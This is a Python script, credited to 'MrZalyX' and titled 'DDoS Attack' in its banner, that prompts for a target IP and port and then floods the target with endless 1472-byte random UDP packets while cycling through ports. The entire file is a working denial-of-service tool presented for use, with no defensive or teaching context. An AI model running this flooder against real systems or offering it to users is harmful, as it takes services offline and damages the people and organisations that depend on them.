import os
import sys
import time
import socket
import random
import ipaddress
from datetime import datetime

def clear_terminal():
    os.system("clear" if os.name == "posix" else "cls")

def banner():
    clear_terminal()
    os.system("figlet DDoS Attack")
    print("Author : MrZalyX")
    print("GitHub : https://github.com/MrZalyX\n")

def get_target():
    try:
        while True:
            ip = input("Target IP Address : ")
            try:
                ipaddress.ip_address(ip)
                break
            except ValueError:
                print("Invalid IP address, please enter a correct IPv4 or IPv6 address.")
    except KeyboardInterrupt:
        print("\n\n[!] Input cancelled by user. Exiting.")
        exit(0)

    try:
        while True:
            try:
                port = int(input("Target Port       : "))
                if 0 < port < 65536:
                    break
                else:
                    print("Port must be between 1 and 65535.")
            except ValueError:
                print("Please enter a valid port number.")
    except KeyboardInterrupt:
        print("\n\n[!] Input cancelled by user. Exiting.")
        exit(0)

    try:
        while True:
            print()
            choice = input("Show every packet sent? (Y/N): ").strip().lower()
            if choice == 'y':
                show_all = True
                break
            elif choice == 'n':
                show_all = False
                break
            else:
                print("Please enter 'Y' or 'N'.")
    except KeyboardInterrupt:
        print("\n\n[!] Input cancelled by user. Exiting.")
        exit(0)

    return ip, port, show_all

def loading_animation():
    clear_terminal()
    print("Starting attack... Please wait.\n")
    try:
        for i in range(1, 101):
            bar_length = 30
            filled_length = int(bar_length * i // 100)
            bar = "=" * filled_length + "-" * (bar_length - filled_length)
            print(f"[{bar}] {i}%", end='\r', flush=True)
            time.sleep(0.1)
        print("\n[+] Attack initialized.\n")
    except KeyboardInterrupt:
        print("\n\n[!] Loading cancelled by user.")
        exit(0)

def start_attack(ip, port, show_all=False):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1472)
    sent = 0
    try:
        while True:
            sock.sendto(payload, (ip, port))
            sent += 1
            port += 1
            if port > 65534:
                port = 1

            if show_all or sent % 100000 == 0:
                now = datetime.now().strftime("%H:%M:%S")
                print(f"[{now}] Sent {sent} packets to {ip} through port {port}")
    except KeyboardInterrupt:
        print("\n\n[!] Attack stopped by user.")
        exit(0)

if __name__ == "__main__":
    try:
        banner()
        ip, port, show_all = get_target()
        loading_animation()
        start_attack(ip, port, show_all)
    except KeyboardInterrupt:
        print("\n\n[!] Program interrupted by user. Exiting.")
        exit(0)
